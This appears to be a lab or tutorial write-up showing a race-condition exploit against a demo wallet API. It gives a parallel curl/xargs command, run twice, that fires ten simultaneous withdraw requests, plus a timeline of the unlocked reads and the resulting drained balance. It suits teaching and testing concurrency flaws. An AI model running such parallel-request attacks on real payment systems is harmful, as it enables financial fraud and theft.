## Wallet Race Condition

A `/wallet/transfer` endpoint that reads a balance and then writes it in two separate operations — with no row locking. This creates a window where multiple requests can read the same balance simultaneously before any of them commit their debit.

## The Weapon: Parallel curl Requests

```bash
printf '%s\n' {1..10} | xargs -n1 -P10 -I{} \
curl -sS -o /dev/null -w "%{http_code}\n" "http://127.0.0.1:3000/api/v1/wallet/withdraw" -X POST \
-H "Accept: application/json" -H "content-type: application/json" \
--data-raw '{"from":"demo1","to":"demo"}'
```

**Breaking down the flags:**

- `printf '%s\n' {1..10}` — generates 10 lines of input, one per request
- `xargs -P10` — runs 10 processes **in parallel** (this is the key)
- `-n1` — feeds one line at a time to each curl process
- `-w "%{http_code}\n"` — prints the HTTP status code of each response
- `-o /dev/null` — discards the response body

## What Happens Inside the Server

```
Time │ Transaction A          │ Transaction B          │ Transaction C ...
─────┼────────────────────────┼────────────────────────┼──────────────
 t1  │ read balance = 100     │                        │
 t2  │                        │ read balance = 100     │  read balance = 100
 t3  │ credit   +100 to dest  │                        │
 t4  │ debit    -100 from src │                        │
 t5  │ COMMIT  (balance = 0)  │ credit +100 to dest    │  credit +100 ...
 t6  │                        │ debit  -100 from src   │  ...
 t7  │                        │ COMMIT (balance = -100)│  COMMIT (balance = -200)
```

Transactions B, C ... all read `balance = 100` before A's debit is visible. They all pass the `balance > 0` check and all transfer the full amount.

## Running the Attack

**Step 1 — Set up a known starting balance.** Assume `demo1` starts with `$100`.

**Step 2 — Fire the attack:**
```bash
printf '%s\n' {1..10} | xargs -n1 -P10 -I{} \
curl -sS -o /dev/null -w "%{http_code}\n" "http://127.0.0.1:3000/api/v1/wallet/withdraw" -X POST \
-H "Accept: application/json" -H "content-type: application/json" \
--data-raw '{"from":"demo1","to":"demo"}'
```

**Step 3 — Observe the result.** You should see multiple `200` responses:
```
200
200
200
200
200
200
200
200
200
200
```

More than one request succeeded — meaning `demo1` was drained more then once. Check the balances:

```
demo1.balance = -900   ← should be 0
demo.balance  = +1000  ← should be 100
```

The attacker manufactured `$900` out of thin air.

---

